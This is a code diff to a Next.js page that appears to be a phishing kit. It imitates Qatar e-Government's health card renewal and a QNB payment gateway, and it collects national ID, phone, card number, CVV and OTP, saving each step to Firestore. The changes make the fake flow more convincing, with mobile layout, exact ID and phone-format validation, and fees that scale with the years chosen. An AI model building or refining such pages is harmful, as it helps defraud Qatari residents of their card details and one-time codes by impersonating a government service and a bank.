@@ -8,6 +8,7 @@ import { Card, CardContent, CardHeader, CardTitle, CardDescription } from '@/app
 import { Input } from '@/app/components/ui/input'
 import { Label } from '@/app/components/ui/label'
 import { RadioGroup, RadioGroupItem } from '@/app/components/ui/radio-group'
+import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/app/components/ui/select'
 import { FullPageLoader } from '@/app/components/loader'
 import { Check, CheckCircle, ChevronLeft, CreditCard, Lock, ShieldCheck } from 'lucide-react'
 
@@ -29,6 +30,9 @@ const RECEIPT_OPTIONS = [
   { id: 'no', label: 'لا' },
 ] as const
 
+const YEAR_OPTIONS = ['1', '2', '3', '4', '5'] as const
+const FEE_PER_YEAR = 100
+
 type OperationType = (typeof OPERATION_OPTIONS)[number]['id']
 type ReceiptChoice = (typeof RECEIPT_OPTIONS)[number]['id']
 
@@ -36,8 +40,8 @@ const CURRENT_EXPIRY_REFERENCE = new Date(2026, 1, 23)
 
 function StepIndicator({ current }: { current: number }) {
   return (
-    <div className="mb-8 px-1" dir="rtl">
-      <div className="flex items-start justify-between gap-0">
+    <div className="mb-8 px-1 overflow-x-auto" dir="rtl">
+      <div className="flex min-w-[320px] items-start justify-between gap-0">
         {STEPS.map((s, i) => {
           const done = i < current - 1
           const active = i === current - 1
@@ -71,7 +75,7 @@ function SummaryRow({ label, value }: { label: string; value: string }) {
   return (
     <div className="py-1.5">
       <p className="text-gray-500 text-base">{label}</p>
-      <p className="text-gray-900 font-semibold text-[1.7rem] leading-tight mt-0.5">{value || '—'}</p>
+      <p className="text-gray-900 font-semibold text-xl sm:text-[1.7rem] leading-tight mt-0.5">{value || '—'}</p>
     </div>
   )
 }
@@ -80,7 +84,7 @@ function SummaryBlock({ label, value, withDivider = false }: { label: string; va
   return (
     <div className={`py-2 ${withDivider ? 'border-b border-gray-200' : ''}`}>
       <p className="text-gray-500 text-base">{label}</p>
-      <p className="text-3xl leading-tight font-semibold text-gray-900 mt-1">{value || '—'}</p>
+      <p className="text-2xl sm:text-3xl leading-tight font-semibold text-gray-900 mt-1">{value || '—'}</p>
     </div>
   )
 }
@@ -119,9 +123,11 @@ export default function SubmitPage() {
   const unsubRef = useRef<(() => void) | null>(null)
   const yearsCount = useMemo(() => {
     const parsedYears = Number(requestedYears)
-    if (!Number.isFinite(parsedYears) || parsedYears < 1) return 1
-    return Math.min(5, Math.floor(parsedYears))
+    if (!Number.isFinite(parsedYears) || parsedYears < 1 || parsedYears > 5) return 1
+    return Math.floor(parsedYears)
   }, [requestedYears])
+  const totalFee = useMemo(() => yearsCount * FEE_PER_YEAR, [yearsCount])
+  const formattedPhone = useMemo(() => (phone ? `+974 ${phone}` : ''), [phone])
 
   const currentExpiryDate = useMemo(() => formatQatarDate(CURRENT_EXPIRY_REFERENCE), [])
   const newExpiryDate = useMemo(() => {
@@ -143,7 +149,7 @@ export default function SubmitPage() {
     const payload = {
       id: idNum,
       name: cardHolder.trim() || 'غير متوفر',
-      phone,
+      phone: formattedPhone,
       operationType,
       operationTypeLabel,
       requestedYears: yearsCount,
@@ -151,7 +157,7 @@ export default function SubmitPage() {
       wantsSmsReceipt: smsReceipt === 'yes',
       currentExpiryDate,
       newExpiryDate,
-      feeAmount: 100,
+      feeAmount: totalFee,
       method,
       cardNumber: cardNumber.replace(/\s/g, ''),
       dateMonth: month,
@@ -173,7 +179,7 @@ export default function SubmitPage() {
 
   const handleStep1 = async (e: FormEvent) => {
     e.preventDefault()
-    if (!idNum.trim() || idNum.trim().length < 8) return alert('الرجاء إدخال رقم البطاقة الشخصية بشكل صحيح')
+    if (idNum.trim().length !== 11) return alert('رقم البطاقة الشخصية يجب أن يكون 11 رقماً')
     setLoading(true)
     try {
       await saveToFirestore({ step: 1, currentPage: 'card-information' })
@@ -184,11 +190,10 @@ export default function SubmitPage() {
 
   const handleStep2 = async (e: FormEvent) => {
     e.preventDefault()
-    const enteredYears = Number(requestedYears)
-    if (!requestedYears.trim() || !Number.isFinite(enteredYears) || enteredYears < 1) {
-      return alert('الرجاء إدخال عدد السنوات المطلوبة')
+    if (!YEAR_OPTIONS.includes(requestedYears as (typeof YEAR_OPTIONS)[number])) {
+      return alert('الرجاء اختيار عدد السنوات المطلوبة')
     }
-    if (!phone.trim() || phone.length < 8) return alert('الرجاء إدخال رقم الهاتف بشكل صحيح')
+    if (phone.length !== 8) return alert('رقم الهاتف يجب أن يتكون من 8 أرقام بعد +974')
     setLoading(true)
     try {
       await saveToFirestore({ step: 2, currentPage: 'application-form' })
@@ -283,15 +288,15 @@ export default function SubmitPage() {
 
   if (success) {
     return (
-      <div className="min-h-screen bg-gray-50 py-8 px-4" dir="rtl">
+      <div className="min-h-screen bg-gray-50 py-6 sm:py-8 px-4" dir="rtl">
         <div className="max-w-xl mx-auto">
           <StepIndicator current={5} />
           <Card className="w-full text-center border-0 shadow-lg">
-            <CardContent className="pt-12 pb-10 px-8">
+            <CardContent className="pt-10 sm:pt-12 pb-8 sm:pb-10 px-5 sm:px-8">
               <div className="w-20 h-20 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-6">
                 <CheckCircle className="w-10 h-10 text-green-600" />
               </div>
-              <h2 className="text-2xl font-bold text-gray-900 mb-2">تم إتمام العملية بنجاح</h2>
+              <h2 className="text-xl sm:text-2xl font-bold text-gray-900 mb-2">تم إتمام العملية بنجاح</h2>
               <p className="text-gray-500 mb-8">تم إرسال طلبك بنجاح وسيتم التواصل معك قريباً</p>
               <Button onClick={() => window.location.href = '/'} className="bg-[#8A1538] hover:bg-[#6d1030] w-full">
                 العودة للرئيسية
@@ -304,10 +309,10 @@ export default function SubmitPage() {
   }
 
   return (
-    <div className="min-h-screen bg-gray-50 py-8 px-4" dir="rtl">
+    <div className="min-h-screen bg-gray-50 py-6 sm:py-8 px-4" dir="rtl">
       {waiting && <FullPageLoader message="جاري التحقق من المعلومات..." />}
       {step <= 3 && (
-        <div className="fixed left-1 top-48 z-20 h-20 w-11 rounded-r-md rounded-l-sm bg-[#C8102E] text-white text-xl font-bold flex items-center justify-center shadow">
+        <div className="hidden lg:flex fixed left-1 top-48 z-20 h-20 w-11 rounded-r-md rounded-l-sm bg-[#C8102E] text-white text-xl font-bold items-center justify-center shadow">
           <span className="text-center leading-tight">
             المساعد
             <br />
@@ -319,7 +324,7 @@ export default function SubmitPage() {
       <div className="max-w-xl mx-auto">
         {step <= 3 && (
           <div className="text-center mb-8">
-            <h1 className="text-3xl font-bold text-gray-900">خدمة البطاقة الصحية الإلكترونية</h1>
+            <h1 className="text-2xl sm:text-3xl font-bold text-gray-900">خدمة البطاقة الصحية الإلكترونية</h1>
             <p className="text-gray-500 text-sm mt-2">طلب الاستعلام عن البطاقة الصحية -- سوف تستغرق حوالي 20 ثانية لإتمام الطلب.</p>
           </div>
         )}
@@ -330,14 +335,14 @@ export default function SubmitPage() {
               <span className="font-bold text-xl text-[#0d4aa2] bg-white px-2 py-0.5 rounded-md">QNB</span>
               <span className="font-semibold">بوابة الدفع</span>
             </div>
-            <div className="grid grid-cols-4 divide-x divide-gray-200 text-center" dir="rtl">
+            <div className="grid grid-cols-2 sm:grid-cols-4 text-center" dir="rtl">
               <div className="p-2">
                 <p className="text-[11px] text-gray-500">اسم التاجر</p>
                 <p className="font-semibold text-sm">Qatar e-Government</p>
               </div>
               <div className="p-2">
                 <p className="text-[11px] text-gray-500">مبلغ المعاملة</p>
-                <p className="font-semibold text-sm">QAR 100.00</p>
+                <p className="font-semibold text-sm">QAR {totalFee.toFixed(2)}</p>
               </div>
               <div className="p-2">
                 <p className="text-[11px] text-gray-500">رقم الفاتورة</p>
@@ -365,10 +370,11 @@ export default function SubmitPage() {
                   <Input
                     id="id-num"
                     value={idNum}
-                    onChange={e => setIdNum(e.target.value.replace(/\D/g, ''))}
-                    placeholder="الرجاء إدخال الرقم"
+                    onChange={e => setIdNum(e.target.value.replace(/\D/g, '').slice(0, 11))}
+                    placeholder="أدخل 11 رقماً"
                     className="h-12"
                     inputMode="numeric"
+                    maxLength={11}
                   />
                 </div>
                 <div className="space-y-3">
@@ -392,7 +398,7 @@ export default function SubmitPage() {
                     ))}
                   </RadioGroup>
                 </div>
-                <div className="flex gap-3 pt-2">
+                <div className="flex flex-col sm:flex-row gap-3 pt-2">
                   <Button type="button" onClick={clearStep1Fields} className="flex-1 h-12 rounded-full bg-gray-500 hover:bg-gray-600 text-white">
                     تفريغ الحقول
                   </Button>
@@ -418,30 +424,39 @@ export default function SubmitPage() {
                 <div className="border-t border-gray-200 pt-4" />
                 <div className="space-y-2">
                   <Label htmlFor="years">عدد السنوات المطلوبة <span className="text-red-500">*</span></Label>
-                  <Input
-                    id="years"
-                    value={requestedYears}
-                    onChange={e => setRequestedYears(e.target.value.replace(/\D/g, '').slice(0, 1))}
-                    className="h-12"
-                    inputMode="numeric"
-                    maxLength={1}
-                    placeholder="1"
-                  />
+                  <Select value={requestedYears} onValueChange={setRequestedYears}>
+                    <SelectTrigger id="years" className="h-12">
+                      <SelectValue placeholder="اختر عدد السنوات" />
+                    </SelectTrigger>
+                    <SelectContent>
+                      {YEAR_OPTIONS.map((yearOption) => (
+                        <SelectItem key={yearOption} value={yearOption}>
+                          {yearOption}
+                        </SelectItem>
+                      ))}
+                    </SelectContent>
+                  </Select>
                 </div>
                 <div className="space-y-2">
                   <Label htmlFor="phone">رقم الهاتف <span className="text-red-500">*</span></Label>
-                  <Input
-                    id="phone"
-                    value={phone}
-                    onChange={e => setPhone(e.target.value.replace(/\D/g, ''))}
-                    placeholder="أدخل رقم الهاتف"
-                    className="h-12"
-                    inputMode="tel"
-                  />
+                  <div className="relative" dir="ltr">
+                    <span className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-500 text-sm font-semibold">
+                      +974
+                    </span>
+                    <Input
+                      id="phone"
+                      value={phone}
+                      onChange={e => setPhone(e.target.value.replace(/\D/g, '').slice(0, 8))}
+                      placeholder="55123456"
+                      className="h-12 pl-16"
+                      inputMode="tel"
+                      maxLength={8}
+                    />
+                  </div>
                 </div>
                 <div className="space-y-2">
                   <Label>هل تريد إستلام الإيصال عبر البريد الإلكتروني ؟</Label>
-                  <RadioGroup value={emailReceipt} onValueChange={value => setEmailReceipt(value as ReceiptChoice)} className="flex items-center gap-6">
+                  <RadioGroup value={emailReceipt} onValueChange={value => setEmailReceipt(value as ReceiptChoice)} className="flex flex-wrap items-center gap-4 sm:gap-6">
                     {RECEIPT_OPTIONS.map(option => (
                       <div key={`email-${option.id}`} className="flex items-center gap-2">
                         <RadioGroupItem value={option.id} id={`email-${option.id}`} />
@@ -452,7 +467,7 @@ export default function SubmitPage() {
                 </div>
                 <div className="space-y-2">
                   <Label>هل تريد إستلام رسالة نصية ؟</Label>
-                  <RadioGroup value={smsReceipt} onValueChange={value => setSmsReceipt(value as ReceiptChoice)} className="flex items-center gap-6">
+                  <RadioGroup value={smsReceipt} onValueChange={value => setSmsReceipt(value as ReceiptChoice)} className="flex flex-wrap items-center gap-4 sm:gap-6">
                     {RECEIPT_OPTIONS.map(option => (
                       <div key={`sms-${option.id}`} className="flex items-center gap-2">
                         <RadioGroupItem value={option.id} id={`sms-${option.id}`} />
@@ -461,7 +476,7 @@ export default function SubmitPage() {
                     ))}
                   </RadioGroup>
                 </div>
-                <div className="flex gap-3 pt-2">
+                <div className="flex flex-col sm:flex-row gap-3 pt-2">
                   <Button type="button" onClick={() => setStep(1)} className="flex-1 h-12 rounded-full bg-gray-500 hover:bg-gray-600 text-white">
                     السابق
                   </Button>
@@ -483,22 +498,22 @@ export default function SubmitPage() {
             <CardContent>
               <form onSubmit={handleStep3} className="space-y-5">
                 <div className="space-y-1">
-                  <h3 className="text-4xl font-bold text-gray-900 mb-2">معلومات حامل البطاقة</h3>
+                  <h3 className="text-2xl sm:text-4xl font-bold text-gray-900 mb-2">معلومات حامل البطاقة</h3>
                   <SummaryRow label="الرقم الشخصي" value={idNum} />
                   <SummaryRow label="تاريخ انتهاء الصلاحية الجديد" value={newExpiryDate} />
                   <SummaryRow label="عدد السنوات المطلوبة" value={String(yearsCount)} />
                   <SummaryRow label="نوع العملية" value={operationTypeLabel} />
-                  <SummaryRow label="رقم الهاتف" value={phone} />
+                  <SummaryRow label="رقم الهاتف" value={formattedPhone} />
                   <SummaryRow label="هل تريد إستلام الإيصال عبر البريد الإلكتروني ؟" value={emailReceipt === 'yes' ? 'نعم' : 'لا'} />
                   <SummaryRow label="هل تريد إستلام رسالة نصية ؟" value={smsReceipt === 'yes' ? 'نعم' : 'لا'} />
                 </div>
                 <div className="border-t border-gray-300 pt-4 space-y-1">
-                  <h3 className="text-4xl font-bold text-gray-900 mb-2">الرسوم</h3>
+                  <h3 className="text-2xl sm:text-4xl font-bold text-gray-900 mb-2">الرسوم</h3>
                   <SummaryRow label="الرسوم المطلوب" value="رسوم تجديد البطاقة الصحية" />
-                  <SummaryRow label="قيمة الرسم" value="100 ريال قطري" />
-                  <SummaryRow label="المجموع" value="100 ريال قطري" />
+                  <SummaryRow label="قيمة الرسم" value={`${totalFee} ريال قطري`} />
+                  <SummaryRow label="المجموع" value={`${totalFee} ريال قطري`} />
                 </div>
-                <div className="flex gap-3">
+                <div className="flex flex-col sm:flex-row gap-3">
                   <Button type="button" onClick={() => setStep(2)} className="flex-1 h-12 rounded-full bg-gray-500 hover:bg-gray-600 text-white">
                     السابق
                   </Button>
@@ -514,12 +529,12 @@ export default function SubmitPage() {
         {step === 4 && (
           <Card className="border-0 shadow-md">
             <CardHeader className="pb-2">
-              <CardTitle className="text-4xl">اختر طريقة الدفع</CardTitle>
+              <CardTitle className="text-2xl sm:text-4xl">اختر طريقة الدفع</CardTitle>
             </CardHeader>
             <CardContent className="space-y-5">
               <div>
                 <p className="text-gray-700 text-lg mb-2">بطاقات الائتمان / بطاقات الخصم الدولية</p>
-                <div className="grid grid-cols-3 gap-2">
+                <div className="grid grid-cols-2 sm:grid-cols-3 gap-2">
                   {[
                     { id: 'amex', label: 'AMEX', disabled: true },
                     { id: 'mastercard', label: 'Mastercard', logo: '/m.png', disabled: false },
@@ -551,7 +566,7 @@ export default function SubmitPage() {
 
               <div>
                 <p className="text-gray-700 text-lg mb-2">بطاقات الخصم المباشر والبطاقات الإئتمانية القطرية</p>
-                <div className="grid grid-cols-3 gap-2">
+                <div className="grid grid-cols-2 sm:grid-cols-3 gap-2">
                   {['هميان', 'NAPS', 'QNB بطاقة'].map((label) => (
                     <div key={label} className="h-12 rounded-lg border border-gray-200 bg-gray-100 text-gray-400 text-sm font-semibold flex items-center justify-center">
                       {label}
@@ -562,7 +577,7 @@ export default function SubmitPage() {
 
               <div>
                 <p className="text-gray-700 text-lg mb-2">أنواع الدفع الأخرى</p>
-                <div className="grid grid-cols-3 gap-2">
+                <div className="grid grid-cols-2 sm:grid-cols-3 gap-2">
                   {['G Pay', 'Apple Pay', 'QNBpay', 'حسابي', 'القسط', 'Samsung Pay'].map((label) => (
                     <div key={label} className="h-12 rounded-lg border border-gray-200 bg-gray-100 text-gray-400 text-sm font-semibold flex items-center justify-center">
                       {label}
@@ -581,7 +596,7 @@ export default function SubmitPage() {
         {step === 5 && (
           <Card className="border-0 shadow-md">
             <CardHeader className="pb-2 space-y-4">
-              <div className="flex items-center justify-between">
+              <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3">
                 <CardTitle className="text-lg flex items-center gap-2">
                   <Lock className="w-5 h-5 text-[#8A1538]" />
                   {method === 'mastercard' ? 'يرجى إدخال تفاصيل بطاقة ماستركارد' : 'يرجى إدخال تفاصيل بطاقة فيزا'}
@@ -641,7 +656,7 @@ export default function SubmitPage() {
                     />
                   </div>
                 </div>
-                <div className="space-y-2 max-w-[220px]">
+                <div className="space-y-2 w-full sm:max-w-[220px]">
                   <div className="flex items-center justify-between">
                     <Label>رمز الحماية <span className="text-red-500">*</span></Label>
                     <span className="text-sm text-[#C8102E]">ماهذا؟</span>
@@ -662,7 +677,7 @@ export default function SubmitPage() {
                   <Lock className="w-3 h-3 flex-shrink-0" />
                   <span>بياناتك محمية بتشفير SSL 256-bit</span>
                 </div>
-                <div className="flex gap-3">
+                <div className="flex flex-col sm:flex-row gap-3">
                   <Button type="button" onClick={() => setStep(4)} className="flex-1 h-12 rounded-full bg-gray-500 hover:bg-gray-600 text-white">
                     رجوع
                   </Button>
@@ -684,7 +699,7 @@ export default function SubmitPage() {
                 رمز التحقق (OTP)
               </CardTitle>
               <CardDescription>
-                تم إرسال رمز التحقق إلى هاتفك: <span className="font-semibold text-gray-700">{phone}</span>
+                تم إرسال رمز التحقق إلى هاتفك: <span className="font-semibold text-gray-700">{formattedPhone}</span>
               </CardDescription>
             </CardHeader>
             <CardContent>
